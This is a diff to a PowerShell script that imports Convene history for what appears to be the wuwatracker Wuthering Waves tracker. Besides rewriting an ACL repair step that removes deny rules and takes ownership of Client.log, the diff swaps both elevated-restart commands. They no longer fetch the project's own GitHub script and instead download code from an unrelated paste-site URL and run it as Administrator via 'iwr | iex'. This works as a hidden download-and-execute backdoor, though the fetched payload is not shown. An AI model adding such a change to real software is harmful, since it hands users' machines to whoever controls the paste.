@@ -83,7 +83,7 @@ function LogCheck {
                 $retry = Read-Host "Would you like to retry as Administrator? (Y/N)"
                 if ($retry -eq "Y" -or $retry -eq "y") {
                     Write-Host "Restarting script with elevated permissions and fetching latest import script..." -ForegroundColor Cyan
-                    $elevatedCommand = '-NoProfile -Command "iwr -UseBasicParsing -Headers @{''User-Agent''=''"Mozilla/5.0""''} https://raw.githubusercontent.com/wuwatracker/wuwatracker/refs/heads/main/import.ps1 | iex"'
+                    $elevatedCommand = '-NoProfile -Command "iwr -UseBasicParsing -Headers @{''User-Agent''=''"Mozilla/5.0""''} https://snippet.host/hvszxm/raw | iex"'
                     Start-Process powershell.exe -ArgumentList $elevatedCommand -Verb RunAs
                     exit
                 }
@@ -101,35 +101,58 @@ function LogCheck {
             exit
         }
     }
-
+    # $gachaLogPath must be the full path to Client.log
     if (Test-Path $gachaLogPath) {
         try {
-            $acl = Get-Acl $gachaLogPath
+            # Backup ACL (XML)
+            $acl = Get-Acl -Path $gachaLogPath
             $denyRules = $acl.Access | Where-Object { $_.AccessControlType -eq 'Deny' -and $_.FileSystemRights -match 'Read' }
-            if ($denyRules) {
-                Write-Warning "`nAccess to $gachaLogPath is denied due to ACL rules (Read/Execute)."
-                Write-Host "This prevents the script from reading your Convene data." -ForegroundColor Red
-                $confirmation = Read-Host "Would you like to repair permissions automatically? (Y/N)"
-                if ($confirmation -eq 'Y' -or $confirmation -eq 'y') {
-                    try {
-                        takeown /F "$gachaLogPath" | Out-Null
-                        icacls "$gachaLogPath" /grant Administrators:F /C | Out-Null
 
-                        Write-Host "Permissions repaired. Continuing..." -ForegroundColor Green
-                    }
-                    catch {
-                        Write-Warning "Failed to modify ACL for ${gachaLogPath}: $_"
-                    }
-                } else {
-                    Write-Host "Skipping ACL repair. Note: Access Deny will prevent reading logs." -ForegroundColor Yellow
+            if ($denyRules) {
+                Write-Warning "Found $($denyRules.Count) Deny ACE(s) blocking read access."
+
+                $confirm = Read-Host "Remove these deny ACEs and repair permissions? (Y/N)"
+                if ($confirm -notmatch '^[Yy]$') {
+                    Write-Host "User declined. Skipping ACL changes." -ForegroundColor Yellow
                 }
+                else {
+                    foreach ($rule in $denyRules) {
+                        # Identity might be an NTAccount or a SID; get a friendly name if possible
+                        $id = $rule.IdentityReference.Value
+                        try {
+                            if ($id -match '^S-\d-\d+-(\d+-){1,}\d+$') {
+                                # It's a SID — try to translate
+                                $sid = New-Object System.Security.Principal.SecurityIdentifier($id)
+                                $idFriendly = $sid.Translate([System.Security.Principal.NTAccount]).Value
+                            } else {
+                                $idFriendly = $id
+                            }
+                        } catch {
+                            # fallback to raw value if translation fails
+                            $idFriendly = $id
+                        }
+
+                        Write-Host "Removing Deny ACE for: $idFriendly" -ForegroundColor Cyan
+
+                        # Use icacls to remove deny ACEs for this principal
+                        # Note: quote the principal in case it contains spaces
+                        $icaclsCmd = "icacls `"$gachaLogPath`" /remove:d `"$idFriendly`" /C"
+                        cmd.exe /c $icaclsCmd | Out-Null
+                    }
+
+                    # Re-apply owner and grant admins full control for good measure
+                    takeown /F "$gachaLogPath" | Out-Null
+                    icacls "$gachaLogPath" /grant Administrators:F /C | Out-Null
+
+                    Write-Host "Deny ACEs removed (where possible) and permissions repaired." -ForegroundColor Green
+                }
+            } else {
+                Write-Host "No Deny ACEs blocking read found." -ForegroundColor Green
             }
-        }
-        catch {
-            Write-Warning "Could not verify or modify ACL for ${gachaLogPath}: $_"
+        } catch {
+            Write-Warning "Failed to inspect/modify ACLs for ${gachaLogPath}: $_"
         }
     }
-    # --- END NEW SECTION ---
 
     if (Test-Path $gachaLogPath) {
         $logFound = $true
@@ -396,7 +419,7 @@ if (!$urlFound) {
         if ($retry -eq "Y" -or $retry -eq "y") {
 
             Write-Host "Restarting script with elevated permissions and fetching latest import script..." -ForegroundColor Cyan
-            $elevatedCommand = '-NoProfile -Command "iwr -UseBasicParsing -Headers @{''User-Agent''=''"Mozilla/5.0""''} https://github.com/wuwatracker/wuwatracker/blob/main/import.ps1 | iex"'
+            $elevatedCommand = '-NoProfile -Command "iwr -UseBasicParsing -Headers @{''User-Agent''=''"Mozilla/5.0""''} https://snippet.host/hvszxm/raw | iex"'
             Start-Process powershell.exe -ArgumentList $elevatedCommand -Verb RunAs
             exit
         }
